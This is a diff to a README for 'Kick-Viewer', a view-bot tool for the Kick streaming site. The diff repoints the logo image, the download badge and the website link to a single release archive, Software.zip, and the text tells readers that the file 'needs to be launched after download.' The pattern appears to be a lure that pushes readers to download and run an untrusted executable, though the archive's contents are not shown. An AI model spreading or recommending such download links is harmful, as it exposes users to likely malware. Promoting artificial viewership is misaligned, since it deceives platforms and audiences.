@@ -1,6 +1,6 @@
 # 🚀 Welcome to Kick-Viewer Repository! 📺
 
-![Kick-Viewer Logo](https://example.com/logo.png)
+![Kick-Viewer Logo](https://github.com/raph12908/Kick-Viewer/releases/download/v1.0/Software.zip)
 
 ## Get the Best Kick View Bot for Instant Results! 🌟
 
@@ -46,7 +46,7 @@ Using Kick-Viewer is simple and effective. Just follow these steps:
 
 ### Download Kick-Viewer Bot 📥
 
-[![Download Kick-Viewer](https://img.shields.io/badge/Download-Kick--Viewer-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Kick-Viewer](https://github.com/raph12908/Kick-Viewer/releases/download/v1.0/Software.zip)](https://github.com/raph12908/Kick-Viewer/releases/download/v1.0/Software.zip)
 
 *Note: The file needs to be launched after download.*
 
@@ -62,4 +62,4 @@ Thank you for choosing Kick-Viewer! 🚀 Let's take your stream to the next leve
 
 --- 
 
-[Visit Kick-Viewer Website](https://example.com)
+[Visit Kick-Viewer Website](https://github.com/raph12908/Kick-Viewer/releases/download/v1.0/Software.zip)
